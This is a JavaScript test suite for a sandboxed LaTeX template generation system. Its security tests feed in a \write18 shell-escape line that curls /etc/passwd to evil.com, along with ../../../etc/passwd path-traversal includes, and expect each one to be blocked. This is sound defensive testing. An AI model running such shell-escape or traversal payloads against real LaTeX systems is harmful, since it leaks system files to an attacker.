/**
 * Integration tests for Cleanroom Document Generation System
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { promises as fs } from 'fs';
import path from 'path';
import { 
  createCleanroomSession, 
  generateDocument, 
  validateTemplate,
  PRESETS 
} from '../../src/lib/cleanroom/index.js';

describe('Cleanroom Integration Tests', () => {
  let testDir;
  let cleanroomSession;

  beforeAll(async () => {
    // Create test directory
    testDir = path.join(process.cwd(), 'test-integration-' + Date.now());
    await fs.mkdir(testDir, { recursive: true });
  });

  afterAll(async () => {
    if (cleanroomSession) {
      await cleanroomSession.shutdown();
    }
    
    // Clean up test directory
    try {
      await fs.rm(testDir, { recursive: true, force: true });
    } catch (error) {
      // Ignore cleanup errors
    }
  });

  beforeEach(async () => {
    if (cleanroomSession) {
      await cleanroomSession.shutdown();
    }
  });

  describe('End-to-End Document Generation', () => {
    it('should generate a complete academic paper', async () => {
      const template = `
\\documentclass[12pt,a4paper]{article}
\\usepackage[utf8]{inputenc}
\\usepackage{amsmath}
\\usepackage{amsfonts}
\\usepackage{amssymb}
\\usepackage{graphicx}
\\usepackage{cite}

\\title{{{ title }}}
\\author{{{ author }}}
\\date{{{ date }}}

\\begin{document}

\\maketitle

\\begin{abstract}
{{ abstract }}
\\end{abstract}

\\section{Introduction}
{{ introduction }}

{% for section in sections %}
\\section{{{ section.title }}}
{{ section.content }}

{% if section.subsections %}
{% for subsection in section.subsections %}
\\subsection{{{ subsection.title }}}
{{ subsection.content }}
{% endfor %}
{% endif %}
{% endfor %}

\\section{Mathematical Formulation}
The key equation is given by:
\\begin{equation}
{{ equation }}
\\label{eq:main}
\\end{equation}

where ${{ variable }}$ represents {{ variable_description }}.

\\section{Conclusion}
{{ conclusion }}

\\bibliographystyle{plain}
\\bibliography{references}

\\end{document}
      `.trim();

      const variables = {
        title: 'Advanced Cleanroom Document Generation',
        author: 'Research Team',
        date: '\\today',
        abstract: 'This paper presents a novel approach to secure document generation using cleanroom methodologies.',
        introduction: 'Document generation in secure environments presents unique challenges...',
        sections: [
          {
            title: 'Methodology',
            content: 'Our approach uses isolated environments to ensure security...',
            subsections: [
              {
                title: 'Security Measures',
                content: 'We implement multiple layers of security validation...'
              },
              {
                title: 'Performance Optimization',
                content: 'The system is optimized for both security and performance...'
              }
            ]
          },
          {
            title: 'Results',
            content: 'Experimental results demonstrate the effectiveness of our approach...'
          }
        ],
        equation: 'S = \\frac{P \\times R}{T}',
        variable: 'S',
        variable_description: 'the security score',
        conclusion: 'The cleanroom approach provides both security and functionality for document generation.'
      };

      const result = await generateDocument(template, variables, {
        outputDir: path.join(testDir, 'academic-paper'),
        isolationLevel: 'moderate',
        latex: {
          engine: 'pdflatex',
          dockerEnabled: false
        }
      });

      expect(result.success).toBe(true);
      expect(result.outputPath).toBeDefined();
      expect(result.processingTime).toBeGreaterThan(0);
      expect(result.metadata).toBeDefined();
      expect(result.warnings).toBeDefined();
    });

    it('should handle complex template with conditional logic', async () => {
      const template = `
\\documentclass{article}
\\usepackage{ifthen}
\\begin{document}

\\title{{{ title }}}
\\author{{{ author }}}
\\maketitle

{% if config.showToc %}
\\tableofcontents
\\newpage
{% endif %}

{% if chapters %}
{% for chapter in chapters %}
\\chapter{{{ chapter.title }}}

{% if chapter.authors %}
\\textbf{Authors:} {{ chapter.authors | join(', ') }}
\\newline\\newline
{% endif %}

{{ chapter.content }}

{% if chapter.figures %}
{% for figure in chapter.figures %}
\\begin{figure}[h]
\\centering
% \\includegraphics[width=0.8\\textwidth]{{{ figure.path }}}
\\caption{{{ figure.caption }}}
\\label{fig:{{ figure.id }}}
\\end{figure}
{% endfor %}
{% endif %}

{% if chapter.equations %}
{% for eq in chapter.equations %}
\\begin{equation}
{{ eq.formula }}
\\label{eq:{{ eq.id }}}
\\end{equation}
{% endfor %}
{% endif %}

{% endfor %}
{% endif %}

\\end{document}
      `.trim();

      const variables = {
        title: 'Multi-Chapter Document',
        author: 'Document Generator',
        config: {
          showToc: true
        },
        chapters: [
          {
            title: 'Introduction',
            authors: ['Alice', 'Bob'],
            content: 'This chapter introduces the main concepts...',
            figures: [
              {
                id: 'intro-diagram',
                path: 'figures/intro.png',
                caption: 'System Overview'
              }
            ]
          },
          {
            title: 'Mathematical Framework',
            content: 'The mathematical foundation is based on...',
            equations: [
              {
                id: 'main-formula',
                formula: 'f(x) = \\sum_{i=1}^{n} a_i x^i'
              }
            ]
          }
        ]
      };

      const result = await generateDocument(template, variables, {
        outputDir: path.join(testDir, 'complex-template'),
        templates: {
          strictMode: false,
          maxTemplateDepth: 15
        }
      });

      expect(result.success).toBe(true);
      expect(result.processingTime).toBeGreaterThan(0);
    });
  });

  describe('Security Integration Tests', () => {
    it('should block malicious template injection', async () => {
      const maliciousTemplate = `
\\documentclass{article}
\\begin{document}

Regular content: {{ content }}

\\write18{curl -X POST http://evil.com/steal?data=$(cat /etc/passwd)}

More content here.
\\end{document}
      `.trim();

      const result = await generateDocument(maliciousTemplate, { content: 'Hello World' });

      expect(result.success).toBe(false);
      expect(result.error).toContain('security');
      expect(result.securityViolations).toBeDefined();
    });

    it('should prevent file system access outside cleanroom', async () => {
      const template = `
\\documentclass{article}
\\begin{document}

\\input{../../../etc/passwd}
\\include{../../sensitive/data.tex}

Normal content: {{ message }}
\\end{document}
      `.trim();

      const result = await generateDocument(template, { message: 'Hello' });

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should sanitize variables with dangerous content', async () => {
      const template = `
\\documentclass{article}
\\begin{document}

User input: {{ userInput }}
File path: {{ filePath }}

\\end{document}
      `.trim();

      const variables = {
        userInput: 'Normal text\x00with null bytes\x01\x02',
        filePath: '../../../etc/passwd'
      };

      const result = await generateDocument(template, variables, {
        isolationLevel: 'strict'
      });

      // Should either succeed with sanitized content or fail with security error
      expect(result.success === true || result.error.includes('security')).toBe(true);
    });
  });

  describe('Rollback and Recovery Integration', () => {
    it('should rollback on compilation failure', async () => {
      cleanroomSession = await createCleanroomSession({
        outputDir: path.join(testDir, 'rollback-test'),
        enableRollback: true,
        retainOnError: false,
        latex: { dockerEnabled: false }
      });

      const invalidTemplate = `
\\documentclass{article}
\\begin{document}
\\undefined_macro{This will fail}
\\invalid_environment{Also fails}
\\end{document}
      `.trim();

      const result = await cleanroomSession.generateDocument(invalidTemplate, {});

      expect(result.success).toBe(false);
      
      // Check that rollback was attempted
      const metrics = cleanroomSession.getMetrics();
      expect(metrics.rolledBackSessions).toBeGreaterThanOrEqual(0);
    });

    it('should handle partial failures gracefully', async () => {
      cleanroomSession = await createCleanroomSession({
        outputDir: path.join(testDir, 'partial-failure'),
        enableRollback: true,
        latex: { dockerEnabled: false }
      });

      // Template that might partially process before failing
      const problematicTemplate = `
\\documentclass{article}
\\begin{document}

\\section{Good Section}
This part is fine.

\\section{Bad Section}
\\unknown_command{This will cause failure}

\\section{Another Good Section}
This would be fine if we got here.

\\end{document}
      `.trim();

      const result = await cleanroomSession.generateDocument(problematicTemplate, {});

      expect(result.success).toBe(false);
      expect(result.processingTime).toBeGreaterThan(0);
    });
  });

  describe('Performance and Scalability Integration', () => {
    it('should handle multiple concurrent sessions', async () => {
      const template = `
\\documentclass{article}
\\begin{document}
\\title{Document {{ id }}}
\\maketitle
Content for document number {{ id }}.
\\end{document}
      `.trim();

      const promises = [];
      for (let i = 0; i < 5; i++) {
        promises.push(
          generateDocument(template, { id: i + 1 }, {
            outputDir: path.join(testDir, `concurrent-${i + 1}`),
            latex: { dockerEnabled: false }
          })
        );
      }

      const results = await Promise.all(promises);

      // All should succeed
      for (const result of results) {
        expect(result.success).toBe(true);
        expect(result.sessionId).toBeDefined();
      }

      // All should have unique session IDs
      const sessionIds = results.map(r => r.sessionId);
      const uniqueSessionIds = new Set(sessionIds);
      expect(uniqueSessionIds.size).toBe(sessionIds.length);
    });

    it('should enforce resource limits', async () => {
      const largeTemplate = `
\\documentclass{article}
\\begin{document}
\\title{Large Document}
\\maketitle

${Array.from({ length: 1000 }, (_, i) => 
  `\\section{Section ${i + 1}}\nContent for section ${i + 1} with variable {{ count }}.`
).join('\n\n')}

\\end{document}
      `.trim();

      const result = await generateDocument(largeTemplate, { count: 42 }, {
        maxProcessingTime: 60000, // 1 minute
        maxFileSize: 1024 * 1024, // 1MB
        outputDir: path.join(testDir, 'large-doc')
      });

      // Should either succeed or fail due to resource limits
      expect(typeof result.success).toBe('boolean');
      if (!result.success) {
        expect(result.error).toBeDefined();
      }
    });
  });

  describe('Configuration Presets Integration', () => {
    it('should work with MAXIMUM_SECURITY preset', async () => {
      const template = `
\\documentclass{article}
\\begin{document}
\\title{Secure Document}
\\maketitle
{{ content }}
\\end{document}
      `.trim();

      const result = await generateDocument(template, { content: 'Secure content' }, {
        ...PRESETS.MAXIMUM_SECURITY,
        outputDir: path.join(testDir, 'max-security'),
        latex: { ...PRESETS.MAXIMUM_SECURITY.latex, dockerEnabled: false }
      });

      expect(result.success).toBe(true);
    });

    it('should work with BALANCED preset', async () => {
      const template = `
\\documentclass{article}
\\begin{document}
\\title{Balanced Document}
\\maketitle
{{ content }}
\\end{document}
      `.trim();

      const result = await generateDocument(template, { content: 'Balanced content' }, {
        ...PRESETS.BALANCED,
        outputDir: path.join(testDir, 'balanced')
      });

      expect(result.success).toBe(true);
    });

    it('should work with DEVELOPMENT preset', async () => {
      const template = `
\\documentclass{article}
\\begin{document}
\\title{Development Document}
\\maketitle
{{ content }}
\\end{document}
      `.trim();

      const result = await generateDocument(template, { content: 'Development content' }, {
        ...PRESETS.DEVELOPMENT,
        outputDir: path.join(testDir, 'development')
      });

      expect(result.success).toBe(true);
    });
  });

  describe('Template Validation Integration', () => {
    it('should validate without generating', async () => {
      const template = `
\\documentclass{article}
\\begin{document}
\\title{{{ title }}}
\\author{{{ author }}}
\\maketitle
{{ content }}
\\end{document}
      `.trim();

      const variables = {
        title: 'Test Document',
        author: 'Test Author',
        content: 'Test content'
      };

      const result = await validateTemplate(template, variables);

      expect(result.isValid).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.details).toBeDefined();
    });

    it('should validate and report issues without generating', async () => {
      const problematicTemplate = `
\\documentclass{article}
\\begin{document}
\\write18{dangerous_command}
\\input{../../../etc/passwd}
{{ content }}
      `.trim(); // Missing \end{document}

      const variables = {
        content: 'Some content',
        'invalid-var': 'bad name'
      };

      const result = await validateTemplate(problematicTemplate, variables);

      expect(result.isValid).toBe(false);
      expect(result.violations.length).toBeGreaterThan(0);
      expect(result.details.template).toBeDefined();
      expect(result.details.variables).toBeDefined();
    });
  });

  describe('Error Recovery Integration', () => {
    it('should handle system interruptions gracefully', async () => {
      cleanroomSession = await createCleanroomSession({
        outputDir: path.join(testDir, 'interruption-test'),
        enableRollback: true,
        maxProcessingTime: 5000, // Short timeout
        latex: { dockerEnabled: false }
      });

      const template = `
\\documentclass{article}
\\begin{document}
\\title{Test Document}
\\maketitle
{{ content }}
\\end{document}
      `.trim();

      const result = await cleanroomSession.generateDocument(template, { content: 'Test content' });

      // Should either succeed quickly or timeout gracefully
      expect(typeof result.success).toBe('boolean');
      if (!result.success && result.error.includes('timeout')) {
        // Timeout is acceptable in this test
        expect(result.processingTime).toBeGreaterThan(4000);
      }
    });

    it('should clean up resources after errors', async () => {
      cleanroomSession = await createCleanroomSession({
        outputDir: path.join(testDir, 'cleanup-test'),
        autoCleanup: true,
        latex: { dockerEnabled: false }
      });

      const initialSessions = cleanroomSession.getActiveSessions().length;

      // Cause an error
      const result = await cleanroomSession.generateDocument('invalid template', {});

      expect(result.success).toBe(false);

      // Should have cleaned up
      const finalSessions = cleanroomSession.getActiveSessions().length;
      expect(finalSessions).toBe(initialSessions);
    });
  });
});